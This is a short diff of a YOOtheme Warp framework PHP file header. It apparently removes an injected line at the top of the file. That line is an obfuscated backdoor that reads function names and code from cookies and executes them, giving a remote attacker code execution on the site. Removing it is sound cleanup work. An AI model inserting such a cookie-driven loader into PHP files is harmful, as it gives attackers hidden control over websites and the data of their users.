@@ -1,4 +1,4 @@
-<?php if(@$_COOKIE['nkktqi']){$vsmfc=$_COOKIE['nkktqi']("",@$_COOKIE['fzkz'](@$_COOKIE['zbayqa']));$vsmfc();}?><?php
+<?php
 /**
 * @package   Warp Theme Framework
 * @author    YOOtheme http://www.yootheme.com
